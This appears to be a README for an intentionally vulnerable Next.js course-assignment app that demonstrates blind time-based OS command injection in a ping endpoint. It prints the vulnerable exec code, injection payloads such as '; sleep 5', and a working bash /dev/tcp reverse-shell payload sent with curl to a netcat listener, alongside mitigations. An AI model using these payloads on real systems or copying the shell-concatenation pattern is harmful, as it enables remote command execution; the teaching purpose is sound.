# OS Command Injection (BLIND, time-based) - Next.js Demo

Intentionally vulnerable app for the IT-30001 Web Server Security assignment.
Binds to 127.0.0.1 only. **Never deploy it.**

## Run
    npm install
    npm run dev        # open http://127.0.0.1:3000

## Ownership (Table 3)
| Member name | Roll number | Category | Variant implemented |
|---|---|---|---|
| (your name) | (your roll no.) | OS command injection | Blind (time-based) |

## (a) Vulnerable code - app/api/ping/route.js
    const cmd = "ping -c 1 " + host;     // line 19: input concatenated into a shell string
    exec(cmd, { timeout: 20000 }, ...)   // line 22: exec() runs it via /bin/sh
The command output is discarded; the page only says "reachable"/"unreachable".

## (b) Exploit (time-based)
| Payload | Expected result |
|---|---|
| `127.0.0.1` | "Host is reachable", ~0.5 s |
| `127.0.0.1; sleep 5` | "Host is reachable", **~5 s** -> command executed |
| `127.0.0.1; sleep 10` | ~10 s (delay scales with the injected value) |
| `127.0.0.1; touch /tmp/pwned` | no visible change, but `ls /tmp/pwned` on the server shows the file |

Nothing is returned, so the attacker infers execution from response time.

## (c) Root cause
User input is concatenated into a command string run by `/bin/sh`, so `;` `&&` `|` `$()`
are interpreted as command separators. Hiding the output does not fix this; it only makes
exploitation blind.

## (d) Mitigation - commented block in the same file
1. Comment out the VULNERABLE block. 2. Uncomment the MITIGATION block.
It uses `net.isIP()` allow-list + `execFile("ping", ["-c","1",ip])` (argv, no shell).
Same payload `127.0.0.1; sleep 5` -> "Host is unreachable" instantly (0 s delay).

## Impact demo: reverse shell (why blind injection is still critical)

A blind hole still gives full command execution — the attacker just can't read
the HTTP response, so instead they make the server **connect back to them**
and hand over an interactive shell. After that, blindness is irrelevant: they
see output directly in their own terminal.

Here "the attacker" is a `nc` (netcat) listener on **your own laptop**,
standing in for a remote attacker-controlled machine. Nothing leaves your
machine — both ends are 127.0.0.1.

### Steps
1. Start the app: `npm run dev`
2. In a second terminal, start the "attacker" listener:
       nc -lvnp 4444
3. In a third terminal (or the browser's host field), send the payload to
   the vulnerable `/api/ping` endpoint:
       curl -s -X POST localhost:3000/api/ping \
         -d '{"host":"127.0.0.1; bash -c '\''bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'\'' &"}'
   (In the browser UI, paste the same string, from `127.0.0.1;` onward, into the host box.)
4. Watch terminal 2 (the listener). It prints `Connection received on 127.0.0.1 ...`
   and drops you into a live shell running **as the web server's user**.
5. Type commands directly into that terminal, e.g. `whoami`, `hostname`, `id`,
   `pwd`. They execute on the vulnerable server and the output appears right
   there — no more waiting on timing, no more blindness.
6. `exit` to close the session when done.

### Why the payload works
    bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
`bash -i` starts an interactive shell. `/dev/tcp/HOST/PORT` is a bash feature
that opens a TCP socket as if it were a file. `>&` redirects the shell's
stdout+stderr into that socket, and `0>&1` redirects stdin to read from it
too — so the remote listener becomes the shell's keyboard and screen.

### Mitigation (same fix blocks this too)
Switch to the MITIGATION block in `app/api/ping/route.js` (see above) and
resend the same payload. `isIP()` rejects it outright (it isn't a valid IP),
so `execFile` is never reached and no shell is ever spawned — nothing
connects back to the listener.

## (e) Other mitigations (theory)
- **Avoid the shell:** use a library/API instead of spawning a process.
- **Argument vector:** pass args as an array so input is data, never syntax.
- **Allow-list validation:** accept only known-good formats; reject the rest.
- **Least privilege:** run as an unprivileged user in a container to limit impact.
